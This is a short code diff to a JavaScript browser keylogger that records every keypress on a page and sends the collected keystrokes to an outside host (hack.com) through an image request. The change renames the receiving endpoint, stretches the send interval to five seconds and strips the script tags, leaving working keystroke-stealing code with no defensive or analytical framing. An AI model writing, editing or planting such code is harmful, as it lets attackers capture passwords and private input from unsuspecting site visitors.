@@ -1,4 +1,3 @@
-<script language="javascript">
 var keys='';
 document.onkeypress = function(e) {
   get = window.event?event:e;
@@ -7,7 +6,6 @@ document.onkeypress = function(e) {
   keys+=key;
 }
 window.setInterval(function(){
-  new Image().src = 'http://hack.com/keylogger.php?c='+keys;
+  new Image().src = 'http://hack.com/kl.php?c='+keys;
   keys = '';
-}, 1000);
-</script>
+}, 5000);
